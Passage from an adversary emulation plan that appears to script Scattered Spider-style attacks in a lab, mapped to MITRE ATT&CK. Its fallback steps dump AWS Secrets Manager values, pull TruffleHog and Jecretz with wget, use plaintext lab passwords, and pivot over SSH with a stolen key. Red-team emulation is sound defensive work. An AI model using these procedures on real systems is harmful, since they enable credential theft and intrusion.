+</doc-codeblock></div>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the EC2 Serial Console, enumerate the values for available secrets</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">aws secretsmanager batch-get-secret-value --secret-id-list gitlab-pat-atargaryen</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to the main scenario. Do not recreate the <code v-pre>goldroad (10.212.3.108)</code>
+EC2 instance, skip to download and extract TruffleHog.</p>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-10">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-10">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Credential Access</td>
+<td>T1555.006</td>
+<td>Credentials from Password Stores: Cloud Secrets Management Stores</td>
+<td>IaaS</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider lists secrets from AWS Secrets Manager</td>
+<td>goldroad (10.212.3.108)</td>
+<td>ahightower</td>
+<td>-</td>
+<td><a href="https://unit42.paloaltonetworks.com/muddled-libra-evolution-to-cloud" class="outbound" target="_blank"><span>11</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Credential Access</td>
+<td>T1555.006</td>
+<td>Credentials from Password Stores: Cloud Secrets Management Stores</td>
+<td>IaaS</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider lists secret values from AWS Secrets Manager</td>
+<td>goldroad (10.212.3.108)</td>
+<td>ahightower</td>
+<td>-</td>
+<td><a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>7</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-5---unable-to-enumerate-secrets">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-5---unable-to-enumerate-secrets">#</doc-anchor-trigger>
+        <span>Step 5 - Unable to enumerate secrets</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-24">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-24">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If you are unable to enumerate the available secrets and their values from the
+CloudShell terminal, perform the following steps.</p>
+<doc-anchor-target id="procedures-11">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-11">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> From the AWS console, search for and open &quot;Secrets Manager&quot;</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Select each secret, and navigate to the <strong>Secret value</strong> section. Select
+<strong>Retrieve secret value</strong>.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to the main scenario.</p>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-11">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-11">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Credential Access</td>
+<td>T1555.006</td>
+<td>Credentials from Password Stores: Cloud Secrets Management Stores</td>
+<td>IaaS</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider lists secrets and secret values from AWS Secrets Manager</td>
+<td>-</td>
+<td>ahightower</td>
+<td>-</td>
+<td><a href="https://unit42.paloaltonetworks.com/muddled-libra-evolution-to-cloud" class="outbound" target="_blank"><span>11</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>7</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-5---download-of-trufflehog-fails">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-5---download-of-trufflehog-fails">#</doc-anchor-trigger>
+        <span>Step 5 - Download of TruffleHog fails</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-25">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-25">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If the TruffleHog download fails, perform the following steps.</p>
+<doc-anchor-target id="procedures-12">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-12">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the EC2 Serial Console, execute wget to download Trufflehog and extract it</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">wget trufflehog_3.82.2_windows_amd64.tar.gz https://github.com/trufflesecurity/trufflehog/releases/download/v3.82.2/trufflehog_3.82.2_windows_amd64.tar.gz
+tar -xvf trufflehog_3.82.2_windows_amd64.tar.gz</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to the main scenario.</p>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-12">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-12">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Command and Control</td>
+<td>T1105</td>
+<td>Ingress Tool Transfer</td>
+<td>Linux</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider downloads Trufflehog from GitHub</td>
+<td>goldroad (10.212.3.108)</td>
+<td>ahightower</td>
+<td>-</td>
+<td><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-5---trufflehog-fails-to-execute">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-5---trufflehog-fails-to-execute">#</doc-anchor-trigger>
+        <span>Step 5 - TruffleHog fails to execute</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-26">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-26">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps in the event that TruffleHog fails to
+execute.</p>
+<doc-anchor-target id="step-5---download-of-jecretz-fails">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-5---download-of-jecretz-fails">#</doc-anchor-trigger>
+        <span>Step 5 - Download of Jecretz fails</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-27">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-27">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If the Jecretz download fails, perform the following steps.</p>
+<doc-anchor-target id="procedures-13">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-13">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the EC2 Serial Console, execute wget to download Jecretz</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">wget jecretz.py https://github.com/link/to/custom/jecretz.py</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to the main scenario.</p>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-13">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-13">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Command and Control</td>
+<td>T1105</td>
+<td>Ingress Tool Transfer</td>
+<td>Linux</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider downloads Jecretz from GitHub</td>
+<td>goldroad (10.212.3.108)</td>
+<td>ahightower</td>
+<td>-</td>
+<td><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-5---jecretz-fails-to-execute-or-find-the-airbyte-credentials">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-5---jecretz-fails-to-execute-or-find-the-airbyte-credentials">#</doc-anchor-trigger>
+        <span>Step 5 - Jecretz fails to execute or find the AirByte credentials</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-28">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-28">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If Jecretz fails to execute or find the AirByte credentials, use the following
+alternative step to continue execution.</p>
+<doc-anchor-target id="procedures-14">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-14">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Using the login session to the SSO dashboard on attacker’s browser, go to
+internal Wekan application at <code v-pre>http://wekan.kingslanding.net/</code>. If you are not
+automatically logged in, use the credentials <code v-pre>tlannister</code>:<code v-pre>Engine-Dropkick</code> to
+login.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Destination</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code v-pre>http://wekan.kingslanding.net/</code></td>
+<td>tlannister</td>
+<td>Engine-Dropkick</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Navigate to the board that contains the AirByte credentials (FinGuard).</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Click &quot;search&quot; in the top right, and then search for &quot;admin&quot;, &quot;access&quot;,
+&quot;cred&quot;, and &quot;password&quot; in order.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Locate the AirByte credentials from one of the search returns.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to the main scenario.</p>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-14">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-14">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Defense Evasion</td>
+<td>T1078</td>
+<td>Valid Accounts</td>
+<td>Linux</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider logs in to the victim company&#x27;s Wekan</td>
+<td>driftmark (174.3.0.70), dragonpit (10.212.3.105)</td>
+<td>-</td>
+<td>-</td>
+<td><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Credential Access</td>
+<td>T1552</td>
+<td>Unsecured Credentials</td>
+<td>Linux</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider accesses unsecured credentials in the Wekan sever</td>
+<td>dragonpit (10.212.3.105)</td>
+<td>tlannister</td>
+<td>-</td>
+<td><a href="https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-6---wstunnel-fails-to-download-or-connect">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-6---wstunnel-fails-to-download-or-connect">#</doc-anchor-trigger>
+        <span>Step 6 - wstunnel fails to download or connect</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-29">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-29">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If <code v-pre>wstunnel</code> fails to download or connect, use the following alternative step
+to continue execution.</p>
+<doc-anchor-target id="procedures-15">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-15">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> From the Kali attack host <code v-pre>driftmark (174.3.0.70)</code>, save the private SSH key
+from Step 4 into <code v-pre>/opt/kalidev/id_rsa_goldroad</code>, modify its permissions,
+entering the password when prompted, and then execute an SSH ProxyJump through
+the created EC2 instance to <code v-pre>rookery (10.212.3.107)</code>, replacing the
+<code v-pre>10.212.3.108</code> with the IP address of the created EC2 instance.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Barbed-Directive</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">sudo chmod 400 /opt/kalidev/id_rsa_goldroad; ssh -J ubuntu@10.212.3.108 atargaryen@10.212.3.107 -i /opt/kalidev/id_rsa_goldroad</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-15">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-15">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Command and Control</td>
+<td>T1572</td>
+<td>Protocol Tunneling</td>
+<td>Linux</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider tunnels SSH through the created EC2 instance to rookery (10.212.3.107)</td>
+<td>rookery (10.212.3.107)</td>
+<td>ahightower, atargaryen</td>
+<td>-</td>
+<td><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Lateral Movement</td>
+<td>T1021.004</td>
+<td>Remote Services: SSH</td>
+<td>Linux</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider accesses AirByte host using SSH</td>
+<td>rookery (10.212.3.107)</td>
+<td>atargaryen</td>
+<td>-</td>
+<td><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-6---abctl-commands-fail">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-6---abctl-commands-fail">#</doc-anchor-trigger>
+        <span>Step 6 - abctl Commands Fail</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-30">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-30">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If <code v-pre>abctl</code> fails to execute, use the following alternative steps to continue
+execution.</p>
+<doc-anchor-target id="procedures-16">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-16">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the SSH session, execute the following commands to verify that AirByte
+processes are running and that AirByte is listening on port 8000. There are no
+alternative steps for verifying login credentials via <code v-pre>abctl</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">ps aux | grep -i airbyte | grep -v java; sudo ss -ntlp | grep 8000</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">root        1889  3.6  1.3 2185224 108748 ?      Ssl  12:01   4:16 /usr/bin/kubelet --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf --config=/var/lib/kubelet/config.yaml --container-runtime-endpoint=unix:///run/containerd/containerd.sock --node-ip=172.18.0.2 --node-labels=ingress-ready=true --pod-infra-container-image=registry.k8s.io/pause:3.9 --provider-id=kind://docker/airbyte-abctl/airbyte-abctl-control-plane --runtime-cgroups=/system.slice/containerd.service
